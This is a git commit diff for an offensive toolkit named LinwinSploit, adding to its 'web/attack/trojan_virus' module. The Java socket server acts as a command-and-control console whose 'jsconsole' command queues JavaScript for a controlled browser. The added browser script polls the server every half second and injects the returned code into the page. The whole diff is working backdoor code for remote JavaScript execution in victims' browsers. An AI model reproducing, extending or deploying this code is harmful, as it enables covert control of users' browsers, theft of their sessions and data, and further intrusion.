7dbdf425988d26f6ccfe979fc9d787f4b69da18d
LinWin-Cloud <2382546858@qq.com>
2023-03-23 19:25:41 +0800

    Module/

--- Module/web/attack/trojan_virus/SocketServer/src/SocketServer.java
+++ Module/web/attack/trojan_virus/SocketServer/src/SocketServer.java
@@ -17,10 +17,27 @@ public class SocketServer {
         Thread options = new Thread(new Runnable() {
             @Override
             public void run() {
+                System.out.println("Enter 'help' to get more help information.");
                 while (true) {
                     System.out.print("LinwinSploit (web/attack/trojan_virus) $ ");
                     Scanner scanner = new Scanner(System.in);
                     String command = scanner.nextLine();
+
+                    if (command.equals("help")) {
+                        System.out.println(" |-Help-|\n" +
+                                " 1. jsconsole                      Run javascript on control browser.\n");
+                        continue;
+                    }
+                    if (command.equals("jsconsole")) {
+                        System.out.print("LinwinSploit (web/attack/trojan_virus) [JsConsole] $ ");
+                        Scanner scanner1 = new Scanner(System.in);
+                        String javascript = scanner1.nextLine();
+                        SocketServer.sendCommand = "js: "+javascript;
+                        continue;
+                    }
+                    else {
+                        SocketServer.sendCommand = command;
+                    }
                 }
             }
         });
@@ -35,25 +52,74 @@ public class SocketServer {
                 Socket socket = serverSocket.accept();
                 Future<Integer> future = executorService.submit(new Callable<Integer>() {
                     @Override
-                    public Integer call() throws Exception {
-                        SocketServer.connect = true;
-                        OutputStream outputStream = socket.getOutputStream();
-                        InputStream inputStream = socket.getInputStream();
+                    public Integer call(){
+                        try{
 
-                        PrintWriter printWriter = new PrintWriter(outputStream);
-                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
-                        while (true) {
-                            String message = bufferedReader.readLine();
-                            if (message == null) {
-                                break;
+                            SocketServer.connect = true;
+                            OutputStream outputStream = socket.getOutputStream();
+                            InputStream inputStream = socket.getInputStream();
+
+                            PrintWriter printWriter = new PrintWriter(outputStream);
+                            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
+                            String requests = bufferedReader.readLine();
+                            requests = java.net.URLDecoder.decode(requests);
+                            String url = requests.substring(requests.indexOf(" ")+1,requests.lastIndexOf("H")-1);
+
+                            if (url.equals("/?=shell_api")){
+                                printWriter.println("HTTP/1.1 200 OK");
+                                printWriter.println("Content-Type: text/plain");
+                                printWriter.println();
+                                printWriter.println(SocketServer.sendCommand);
+                                printWriter.flush();
+                                socket.close();
                             }
-                            
+                            if (url.startsWith("/?=shell_return")) {
+                                System.out.println(url.substring(url.indexOf(" ")+1));
+                                printWriter.println("HTTP/1.1 200 OK");
+                                printWriter.println("Content-Type: text/plain");
+                                printWriter.println();
+                                printWriter.flush();
+                                socket.close();
+                            }
+                            if (url.equals("/com.LinwinSoft.app.js")) {
+                                printWriter.println("HTTP/1.1 200 OK");
+                                printWriter.println("Content-Type: application/javascript");
+                                printWriter.println();
+                                try {
+                                    FileReader fileReader = new FileReader("../../com.LinwinSoft.app.js");
+                                    BufferedReader bufferedReader1 = new BufferedReader(fileReader);
+                                    while (true) {
+                                        String line = bufferedReader1.readLine();
+                                        if (line == null) {
+                                            break;
+                                        }
+                                        printWriter.println(line);
+                                        printWriter.flush();
+                                    }
+                                    fileReader.close();
+                                    bufferedReader1.close();
+                                    socket.close();
+                                }catch (Exception exception){
+                                    exception.printStackTrace();
+                                }
+                            }
+                            else {
+                                printWriter.println("HTTP/1.1 200 OK");
+                                printWriter.println("Content-Type: text/html");
+                                printWriter.println();
+                                printWriter.println("<script src='com.LinwinSoft.app.js'></script>");
+                                printWriter.flush();
+                                socket.close();
+                            }
+                            SocketServer.sendCommand = "none";
+                        }catch (Exception exception){
+                            //exception.printStackTrace();
+                            try {
+                                socket.close();
+                            }catch (Exception exception1){
+                                exception1.printStackTrace();
+                            }
                         }
-                        bufferedReader.close();
-                        socket.shutdownInput();
-                        socket.shutdownOutput();
-                        socket.close();
-                        SocketServer.sendCommand = "none";
 
                         return 0;
                     }
--- Module/web/attack/trojan_virus/com.LinwinSoft.app.js
+++ Module/web/attack/trojan_virus/com.LinwinSoft.app.js
@@ -2,3 +2,43 @@
 
 
 console.log("Load OK!")
+
+var loop;
+
+function exec(command) {
+    if (command === 'none') {
+        return false
+    }
+    if (command.startsWith("js: ")) {
+        var javaScript = command.substring("js: ".length,command.length);
+
+        var script = document.createElement("script");
+        script.innerHTML = javaScript;
+        document.body.appendChild(script);
+        return true;
+    }
+    else {
+        
+    }
+}
+
+loop = setInterval(function () {
+    try{
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET","/?=shell_api",true)
+        xhr.send();
+
+        xhr.onload = function (e) {
+            if (xhr.readyState === 4) {
+                if (xhr.status === 200) {
+                    exec(xhr.responseText);
+                }
+                else{
+                    clearInterval(loop);
+                }
+            }
+        };
+    }catch (e){
+        clearInterval(loop);
+    }
+} , 500)
